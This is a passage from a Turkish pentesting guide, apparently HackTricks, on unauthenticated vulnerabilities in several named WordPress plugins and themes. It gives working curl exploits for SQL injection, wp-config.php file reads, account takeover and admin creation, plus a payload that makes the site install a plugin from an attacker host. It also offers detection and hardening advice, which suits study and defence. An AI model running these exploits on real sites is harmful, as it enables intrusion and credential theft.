- Brute Force saldırılarını önlemek için **giriş denemelerini sınırlandırın**
- **`wp-admin.php`** dosyasının adını değiştirin ve erişime yalnızca dahili ağdan veya belirli IP adreslerinden izin verin.


### Yetersiz doğrulama nedeniyle kimlik doğrulaması gerektirmeyen SQL Injection (WP Job Portal <= 2.3.2)

WP Job Portal recruitment plugin, en nihayetinde `modules/category/model.php::validateFormData()` içinde aşağıdaki zafiyetli kodu çalıştıran **savecategory** görevini açığa çıkardı:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Bu kod parçasının yol açtığı problemler:

1. **Temizlenmemiş kullanıcı girişi** – `parentid` doğrudan HTTP isteğinden geliyor.
2. **WHERE koşulu içinde string birleştirme** – `is_numeric()` / `esc_sql()` / prepared statement yok.
3. **Kimlik doğrulama gerektirmeyen erişilebilirlik** – action `admin-post.php` üzerinden çalıştırılsa da, mevcut tek kontrol bir **CSRF nonce** (`wp_verify_nonce()`), ki bu herhangi bir ziyaretçi tarafından kısa kodu `[wpjobportal_my_resumes]` içeren açık bir sayfadan alınabilir.

#### İstismar

1. Yeni bir nonce al:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`'i kötüye kullanarak keyfi SQL enjekte et:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Yanıt, enjekte edilen sorgunun sonucunu açığa çıkarır veya veritabanını değiştirir; bu da SQLi'yi kanıtlar.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Başka bir task, **downloadcustomfile**, ziyaretçilerin path traversal yoluyla diskteki **herhangi bir dosyayı** indirmesine izin veriyordu. Zayıf nokta `modules/customfield/model.php::downloadCustomUploadedFile()` içinde bulunuyor:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` saldırgan tarafından kontrol ediliyor ve **temizleme uygulanmadan** birleştiriliyor. Yine, tek engel **CSRF nonce** olup bu nonce özgeçmiş sayfasından alınabiliyor.

#### İstismar
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Sunucu `wp-config.php` içeriğiyle yanıt verir, leaking DB credentials ve auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Birçok tema/eklenti, admin-ajax.php üzerinden erişilebilen "social login" yardımcıları ile gelir. Eğer bir unauthenticated AJAX action (wp_ajax_nopriv_...) sağlayıcı verisi eksik olduğunda istemci tarafından sağlanan tanımlayıcılara güvenip ardından wp_set_auth_cookie() çağırıyorsa, bu tam bir authentication bypass'a dönüşür.

Tipik hatalı desen (basitleştirilmiş)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Neden sömürülebilir

- Kimlik doğrulanmamış erişim admin-ajax.php üzerinden (wp_ajax_nopriv_… action).
- Durum değişikliğinden önce nonce/capability kontrolleri yok.
- OAuth/OpenID sağlayıcı doğrulaması eksik; varsayılan branch saldırgan girdisini kabul ediyor.
- get_user_by('email', $_POST['id']) followed by wp_set_auth_cookie($uid) istekte bulunanı herhangi bir mevcut e-posta adresi olarak yetkilendiriyor.

İstismar (kimlik doğrulanmamış)

- Önkoşullar: saldırgan /wp-admin/admin-ajax.php adresine erişebiliyor ve geçerli bir kullanıcı e-postasını biliyor/tahmin ediyor.
- provider'ı desteklenmeyen bir değere ayarlayın (veya hiç göndermeyin) böylece varsayılan branch'e girilir ve id=<victim_email> gönderilir.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- Do not derive identity from client input. Only accept emails/IDs originating from a validated provider token/ID.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid providers (no fallback to POST id).
- Consider temporarily disabling social login or virtually patching at the edge (block the vulnerable action) until fixed.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ≤ 1.0.82)

Bazı pluginler, çağıranın yeteneklerini doğrulamadan yeniden kullanılabilir “connection keys” veya tokenlar mint eden REST endpointleri açığa çıkarır. Eğer route sadece tahmin edilebilir bir özniteliğe göre (örn. username) authenticate ediyorsa ve key’i kullanıcı/oturum ile capability checks ile bağlamıyorsa, herhangi bir unauthenticated attacker bir key mint edebilir ve ayrıcalıklı işlemleri tetikleyebilir (admin hesap oluşturma, plugin actions → RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Neden sömürülebilir
- Düşük entropili kimlik kanıtı (username) ile korunmuş veya permission_callback eksik olan hassas REST rota
- Yetki (capability) denetimi yok; oluşturulan anahtar evrensel bir baypas olarak kabul ediliyor

Tespit kontrol listesi
- Eklenti kodunda şu ifadeyi grep edin: register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- İstemci tarafından sağlanan kimlik (username/email) temel alınarak token/anahtar veren ve bunu doğrulanmış bir kullanıcıya veya capability'ye bağlamayan herhangi bir rota
- Sunucu tarafı capability kontrolleri olmadan oluşturulan token/anahtarı kabul eden sonraki rotaları arayın

Güçlendirme
- Herhangi bir ayrıcalıklı REST rota için: gerekli capability'i dayatan bir permission_callback gerektirin (current_user_can() kullanarak)
- İstemci tarafından sağlanan kimlikten uzun ömürlü anahtarlar oluşturmayın; gerekiyorsa kimlik doğrulama sonrası kısa ömürlü, kullanıcıya bağlı token'lar verin ve kullanımda capability'leri yeniden kontrol edin
- Çağıranın kullanıcı bağlamını doğrulayın (wp_set_current_user tek başına yeterli değildir) ve !is_user_logged_in() || !current_user_can(<cap>) olan istekleri reddedin

---

## Nonce gate misuse → kimlik doğrulanmamış rastgele eklenti kurulumu (FunnelKit Automations ≤ 3.5.3)

Nonces CSRF'i önler, yetkilendirmeyi değil. Eğer kod bir nonce geçişini yeşil ışık olarak değerlendirip ayrıcalıklı işlemler için capability kontrollerini atlıyorsa (ör. install/activate plugins), kimliği doğrulanmamış saldırganlar zayıf bir nonce gereksinimini karşılayıp arka kapılı veya zafiyetli bir eklenti yükleyerek RCE'ye ulaşabilir.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce “passes”
- Impact: full compromise via arbitrary plugin install/activation

PoC (şekli eklentiye bağlıdır; sadece örnek amaçlı)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## Kimlik doğrulaması olmayan SQLi via s search parameter in depicter-* actions (Depicter Slider ≤ 3.6.1)

Multiple depicter-* actions consumed the s (search) parameter and concatenated it into SQL queries without parameterization.

- Parameter: s (search)
- Flaw: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep ile depicter-* action handlers'ı ve SQL içinde $_GET['s'] veya $_POST['s']'in doğrudan kullanımını arayın
- $wpdb->get_results()/query()'e geçirilen ve s ile birleştirilen özel sorguları gözden geçirin

Hardening
- $wpdb->prepare() veya wpdb placeholders'larını her zaman kullanın; beklenmeyen metakarakterleri sunucu tarafında reddedin
- s için sıkı bir allowlist ekleyin ve beklenen karakter seti/uzunluğa normalize edin

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ≤ 2.5.1)

Bir template parametresinde normalizasyon/sınırlama uygulanmadan saldırgan kontrollü yolların kabul edilmesi, rastgele yerel dosyaların okunmasına izin verir ve includable PHP/log dosyaları çalışma zamanına dahil edilirse bazen kod yürütülmesine yol açabilir.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: normalizasyon/allowlisting yok; traversal'a izin veriliyor
- Impact: gizli bilgilerin ifşası (wp-config.php), belirli ortamlarda potansiyel RCE (log poisoning, includable PHP)

PoC – wp-config.php oku
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Tespit kontrol listesi
- Realpath() ile containment kontrolü olmadan istek yollarını include()/require()/read sink'lerine birleştiren herhangi bir işleyici
- Niyet edilen templates dizininin dışına çıkan traversal desenleri (../) arayın

Sertleştirme
- İzin verilen (allowlisted) şablonları zorlayın; realpath() ile çözün ve str_starts_with(realpath(file), realpath(allowed_base)) şartını uygulayın
- Girdiyi normalize edin; traversal dizilerini ve mutlak yolları reddedin; sanitize_file_name()'ı yalnızca dosya adları için kullanın (tam yollar için değil)


## Kaynaklar

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
